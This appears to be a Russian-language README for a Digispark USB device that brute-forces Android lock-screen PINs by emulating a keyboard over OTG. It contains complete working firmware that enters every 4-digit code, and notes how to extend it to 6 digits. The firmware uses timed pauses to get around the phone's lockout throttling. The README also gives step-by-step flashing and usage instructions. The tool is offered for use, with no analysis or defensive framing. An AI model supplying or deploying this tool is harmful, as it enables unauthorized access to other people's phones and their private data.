

# 🔓 Digispark PIN Bruteforce Tool

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform: Digispark](https://img.shields.io/badge/Platform-Digispark-blue)](http://digistump.com/products/1)
[![Language: C++](https://img.shields.io/badge/Language-C++-f34b7d)](https://isocpp.org/)

Автоматический перебор PIN-кода на Android-устройствах с помощью Digispark (ATtiny85). Подключается через OTG, эмулирует USB-клавиатуру и последовательно вводит все комбинации.

---

## 🚀 Возможности

- ✅ Автоматический перебор **4-значных PIN** (от `0000` до `9999`)
- ✅ Автоматический перебор **6-значных PIN** (от `000000` до `999999`)
- ✅ Встроенная защита от блокировки — пауза 31 сек после каждых 5 попыток
- ✅ Визуальная индикация через встроенный светодиод
- ✅ Работает на любом Android-устройстве с поддержкой OTG
- ✅ Не требует root или специальных приложений

---

## 🔧 Аппаратное обеспечение

### Необходимые компоненты

| Компонент | Количество | Примечание |
|-----------|------------|------------|
| **Digispark (ATtiny85)** | 1 шт | Китайский аналог или оригинал |
| **OTG-кабель** | 1 шт | Type-C или Micro-USB под твой телефон |
| **USB-кабель** | 1 шт | Для прошивки (обычно есть в комплекте) |

### Схема подключения

```
[Digispark] --- [OTG-кабель] --- [Android-телефон]
```

Никаких дополнительных компонентов не требуется — всё работает через USB.

## 📦 Установка ПО

### 1. Настройка Arduino IDE под Digispark

1. Открой **Arduino IDE**
2. Перейди в **Файл → Настройки**
3. В поле "Дополнительные ссылки для менеджера плат" добавь:
   ```
   https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json
   ```
4. Нажми **OK**
5. Перейди в **Инструменты → Плата → Менеджер плат**
6. Найди **"Digistump AVR Boards"** и установи
7. Установи библиотеку **DigiKeyboard** через менеджер библиотек

### 2. Установка драйверов (только для Windows)

1. Скачай драйверы с [официального сайта Digistump](https://digistump.com/wiki/digispark/tutorials/windows)
2. Запусти `Install Drivers.exe` от имени администратора
3. Перезагрузи компьютер

## 📝 Прошивка (4-значный PIN)

```cpp
#include "DigiKeyboard.h"

#define LED_PIN 1  // Для Model A, для Model B - 0
#define PIN_LENGTH 4
#define MAX_PIN 9999

void setup() {
  pinMode(LED_PIN, OUTPUT);
  DigiKeyboard.delay(3000);
}

void loop() {
  for (int pin = 0; pin <= MAX_PIN; pin++) {
    
    // Пауза 31 сек после каждых 5 попыток
    if (pin % 5 == 0 && pin > 0) {
      digitalWrite(LED_PIN, HIGH);
      for (int i = 0; i < 31; i++) DigiKeyboard.delay(1000);
      digitalWrite(LED_PIN, LOW);
    }
    
    // Форматируем PIN (0000-9999)
    String pinStr = String(pin);
    while (pinStr.length() < PIN_LENGTH) pinStr = "0" + pinStr;
    
    // Отправляем PIN и Enter
    DigiKeyboard.print(pinStr);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(100);
    DigiKeyboard.sendKeyStroke(0);
    
    // Задержка между попытками
    DigiKeyboard.delay(2000);
    
    // Мигаем после каждой попытки
    digitalWrite(LED_PIN, HIGH);
    DigiKeyboard.delay(50);
    digitalWrite(LED_PIN, LOW);
  }
  
  // Сигнал завершения
  while (true) {
    digitalWrite(LED_PIN, HIGH);
    DigiKeyboard.delay(500);
    digitalWrite(LED_PIN, LOW);
    DigiKeyboard.delay(500);
  }
}
```

> Для **6-значного PIN** замени `MAX_PIN` на `999999`, `PIN_LENGTH` на `6`, а тип переменной `pin` на `long`.

## 📥 Загрузка прошивки

1. Подключи Digispark к компьютеру через USB
2. В Arduino IDE выбери плату: **Digispark (Default - 16.5mhz)**
3. Нажми **Загрузить (Upload)**
4. **ВАЖНО:** Когда появится сообщение *"Plug in device now..."*, быстро вытащи и вставь Digispark обратно
5. Дождись завершения загрузки

**Ожидаемый вывод в консоли:**
```
Running Digispark Uploader...
Plug in device now... (will timeout in 60 seconds)
> Device is found!
> Starting to upload ...
> Micronucleus done. Thank you!
```

## 📱 Использование на телефоне

1. **Вытащи Digispark** из компьютера
2. **Подключи OTG-кабель** к телефону
3. **Вставь Digispark** в OTG-кабель
4. **Наблюдай за светодиодом**:

| Состояние | Индикация |
|-----------|-----------|
| Обычная отправка | Быстрое мигание каждые 2 сек |
| Пауза 31 сек | Светодиод горит постоянно |
| Завершено | Медленное мигание (0.5 сек вкл/выкл) |

## ⚠️ Важные предупреждения

### 🚨 **Автоматический сброс данных**
Современные Android-устройства (Android 5.0+) имеют функцию **Auto Factory Reset**. После 10-15 неудачных попыток ввода PIN телефон может **полностью стереть все данные**.

**Перед использованием обязательно проверь:**
```
Настройки → Безопасность → Автоматический сброс
```

## 🔬 Технические детали

### Как это работает
1. Digispark определяется телефоном как **USB-клавиатура (HID-устройство)**
2. Библиотека `DigiKeyboard.h` эмулирует нажатия клавиш
3. Программа последовательно перебирает все комбинации
4. Встроены задержки для обхода защиты от брутфорса

### Совместимость
| Устройство | Совместимость |
|------------|---------------|
| Android 4.0+ | ✅ Полная |
| Android с Type-C | ✅ С OTG-адаптером |
| Android с Micro-USB | ✅ Напрямую |
| iOS | ❌ Не поддерживается |

## 🛠️ Возможные проблемы и решения

| Проблема | Решение |
|----------|---------|
| "Device search timed out" | Вставляй Digispark **после** появления сообщения |
| Не определяется в Windows | Переустанови драйверы, попробуй другой USB-порт |
| Не работает на телефоне | Проверь поддержку OTG, используй качественный кабель |
| Светодиод не горит | Проверь настройки `LED_PIN` (1 для Model A, 0 для Model B) |
